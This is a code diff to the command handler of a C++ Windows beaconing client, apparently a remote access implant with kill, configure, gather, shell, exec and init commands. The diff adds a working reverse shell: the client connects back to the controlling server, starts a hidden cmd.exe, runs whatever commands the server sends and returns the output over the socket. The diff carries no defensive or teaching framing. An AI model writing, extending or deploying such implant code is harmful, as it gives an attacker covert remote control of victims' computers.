@@ -38,7 +38,7 @@ enum TYPE {
 	KILL, //0-0
 	CONF, //1-VAR-VAL
 	GATH, //2-INF
-	SHELL,//3-0
+	SHELL,//3-P (Port Number)
 	EXEC, //4-COMMAND
 	INIT, //5-0
 };
@@ -323,6 +323,7 @@ size_t executeCommands(std::vector<std::string>* list, client* context) {
 				break;
 			//Case CONF: Configure a global variabl (Such as beaconing sequence, the URL to reach out to, etc....
 			case CONF:
+			{
 				//Grab var name
 				varName = value.substr(0, value.find_first_of("-"));
 				//Grab var value
@@ -337,9 +338,165 @@ size_t executeCommands(std::vector<std::string>* list, client* context) {
 					beaconTime = atoi(varValue.c_str());
 				}
 				break;
+			}
 			//Establish a persistent connection to the server
 			case SHELL:
+			{
+				//Connect to the server on the designated server
+				if (context->clientConn(context, hostname, value) != 0) {
+					OutputDebugStringA("Unable to connect to Server\n");
+					break;
+				}
+				
+				WCHAR ApplicationName[MAX_PATH];	//Buffer for application name (cmd.exe)
+				STARTUPINFO si = { sizeof(si) };	//Startupinfo struct for process
+				PROCESS_INFORMATION pi;					
+				CString output = L"";				//Store output from commArg
+				HANDLE hChildStdout_rd;				 //Used from parent process to Read output from ReadFile
+				HANDLE hChildStdout_wt;				 //Used from child process to write output to pipe
+				HANDLE hChildStdin_rd;				 //Used from parent process to Read output from ReadFile
+				HANDLE hChildStdin_wt;				 //Used from child process to write output to pipe
+				BOOL Status;						 //Status of Proccess/Pipe calls
+				//Create Security Attributes for pipe
+				SECURITY_ATTRIBUTES pipeSecAtt = { sizeof(SECURITY_ATTRIBUTES) };
+				pipeSecAtt.bInheritHandle = TRUE;	//Chile proccess inherits pipe handle
+				pipeSecAtt.lpSecurityDescriptor = NULL;
+				
+				//Create PIPE
+				if (!::CreatePipe(&hChildStdout_rd, &hChildStdout_wt, &pipeSecAtt, 0)) {
+					OutputDebugStringA("Unable to create pipe");
+					break;
+				}
+				if (!::SetHandleInformation(hChildStdout_rd, HANDLE_FLAG_INHERIT, 0)) {
+					break;
+				}
+				if (!::CreatePipe(&hChildStdin_rd, &hChildStdin_wt, &pipeSecAtt, 0)) {
+					OutputDebugStringA("Unable to create pipe");
+					break;
+				}
+				if (!::SetHandleInformation(hChildStdin_wt, HANDLE_FLAG_INHERIT, 0)) {
+					break;
+				}
+				//Ensure structures are clear before setting attributes
+				ZeroMemory(&si, sizeof(si));
+				ZeroMemory(&pi, sizeof(pi));
+
+				//Setup startup info attributes
+				si.cb = sizeof(si);
+				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //Required to set stdout and stdin
+				si.hStdOutput = hChildStdout_wt;	//Requires STARTF_USESTDHANDLES in dwFlags
+				si.hStdError = hChildStdout_wt;  //Requires STARTF_USESTDHANDLES in dwFlags
+				si.hStdInput = hChildStdin_rd;
+				si.wShowWindow = SW_HIDE;	//Hide window
+				//Append command arguments provided from server
+				//wValue.append(std::wstring(value.begin(), value.end()));
+
+				//Create Process
+				if (!::GetEnvironmentVariableW(L"ComSpec", ApplicationName, RTL_NUMBER_OF(ApplicationName))) {
+					OutputDebugStringA("Error Creating Proccess\n");
+				}
+				if (!::CreateProcess(ApplicationName, 0, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {
+					OutputDebugStringA("Error Creating Proccess\n");
+				}
+			
+				else {
+					//Handles for child process no longer needed
+					::CloseHandle(hChildStdout_wt);
+					::CloseHandle(hChildStdin_rd);
+					DWORD dRead, dWritten, statusValue;
+					int bytesRecieved;
+					DWORD bytesAvailable, bytesLeft;
+					char end[] = "END$$";
+					//Allocate memory for command buffer (To recieve from serveR) and output buffer (To send back to server)
+					char* commandBuf;
+					char* outBuf;
+					commandBuf = (char*)malloc(sizeof(char) * 4096);
+					outBuf = (char*)malloc(sizeof(char) * 4096);
+					ZeroMemory(outBuf, 4096);
+					ZeroMemory(commandBuf, 4096);
+					::WaitForSingleObject(pi.hProcess, 100);
+					if ((Status = ReadFile(hChildStdout_rd, outBuf, 4096, &dRead, nullptr)) == 0) {
+						OutputDebugStringA("Client: Unable to write to process");
+						closesocket(context->sock);
+						free(commandBuf);
+						free(outBuf);
+						break;
+					}
+					//	output += CString(buff, dRead);
+					if ((Status = send(context->sock, outBuf, dRead, 0)) == -1) {
+						OutputDebugStringA("Client: Unable to write to process");
+						closesocket(context->sock);
+						free(commandBuf);
+						free(outBuf);
+						break;
+					}
+					//Status = ReadFile(hChildStdout_rd, buff, 4096, &dRead, nullptr);
+					while (true) {
+						//char command[] = "ipconfig\r\n";
+						ZeroMemory(outBuf, 4096);
+						ZeroMemory(commandBuf, 4096);
+						if ((bytesRecieved = recv(context->sock, commandBuf, 4096, 0)) == -1) {
+							OutputDebugStringA("Client: Did not recieve data from server");
+							closesocket(context->sock);
+							free(commandBuf);
+							free(outBuf);
+							break;
+						}
+						
+						if ((Status = WriteFile(hChildStdin_wt, commandBuf, bytesRecieved, &dWritten, NULL)) == 0) {
+							OutputDebugStringA("Client: Unable to write to process");
+							closesocket(context->sock);
+							free(commandBuf);
+							free(outBuf);
+							break;
+						}
+						//Check if data is ready for reading
+						int command;
+						while (true) {
+							//Small sleep to give process time to output data
+							Sleep(250);
+							//Read from named pipe (STDOUT of child process)
+							if ((Status = ReadFile(hChildStdout_rd, outBuf, 4096, &dRead, nullptr)) == 0) {
+								OutputDebugStringA("Client: Unable to write to process");
+								closesocket(context->sock);
+								free(commandBuf);
+								free(outBuf);
+								break;
+							}
+							
+							
+							if (!strcmp(outBuf,commandBuf)) {
+								ZeroMemory(outBuf, 4096);
+								Sleep(5000);
+								continue;
+							}
+							if ((Status = send(context->sock, outBuf, dRead, 0)) == -1) {
+								OutputDebugStringA("Client: Unable to write to process");
+								closesocket(context->sock);
+								free(commandBuf);
+								free(outBuf);
+								break;
+							}
+							::PeekNamedPipe(hChildStdout_rd, NULL, NULL, NULL, &bytesAvailable,&bytesLeft);
+							if (bytesAvailable == 0 && bytesLeft == 0) {
+								send(context->sock, end,strlen(end),0);
+								break;
+							}
+
+						}
+	
+
+						
+					}
+				
+					//Close proccess/threads
+				
+					::CloseHandle(pi.hProcess);
+					::CloseHandle(pi.hThread);
+				}
+
 				break;
+			}
 			//Execute a Command
 			case EXEC:
 			{
@@ -422,6 +579,7 @@ size_t executeCommands(std::vector<std::string>* list, client* context) {
 				break;
 			}
 			case INIT:
+			{
 				std::string init = "<INIT:";
 				init.append(ID);
 				init.append(">");
@@ -441,6 +599,7 @@ size_t executeCommands(std::vector<std::string>* list, client* context) {
 				//Rcieve respone later
 				closesocket(context->sock);
 				break;
+			}
 		}
 		//Call System Commands
 	}
